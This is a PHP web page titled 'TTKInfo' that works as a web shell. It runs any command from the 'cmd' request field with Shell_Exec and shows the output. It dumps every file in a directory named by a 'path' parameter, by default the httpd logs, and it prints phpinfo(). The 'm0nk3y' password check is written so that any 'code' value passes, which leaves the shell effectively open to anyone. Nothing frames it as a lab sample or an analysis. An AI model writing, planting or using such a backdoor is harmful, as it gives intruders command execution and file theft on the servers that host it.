<?php
if (!isset($_REQUEST['code']) && $_REQUEST['code'] != 'm0nk3y') return;
?>
<html>
<head>
        <title>TTKInfo</title>
</head>
<body>

        <h4>shell</h4>
	<?php

	echo '<form method=POST><input name="cmd" style="width: 200px; background: black; color: green;"></form>';
	if (isset($_REQUEST['cmd'])) {
	        echo '<div style="overflow-y: scroll; height:400px; background: black; color: green;"><pre>';
		print Shell_Exec($_REQUEST['cmd']);
	        echo '</pre></div>';
	}
	?>

	<h4>logs</h4>
        <?php
        $path = '/opt/applic/httpd/logs';

        if (isset($_GET['path'])) {
                $path = $_GET['path'];
        }

        $files = array_diff(scandir($path), array('.', '..'));

        foreach ($files as $file)
        {
                echo "<h6>$file</h6>";
                echo '<div style="overflow-y: scroll; height:400px; background: #ddd;"><pre>';
                echo file_get_contents($path . '/' . $file);
                echo '</pre></div>';
        }
        ?>

        <h4>phpinfo</h4>
        <div style="overflow-y: scroll; height:400px; background: #ddd;">
                <?php phpinfo(); ?>
        </div>
</body>
</html>
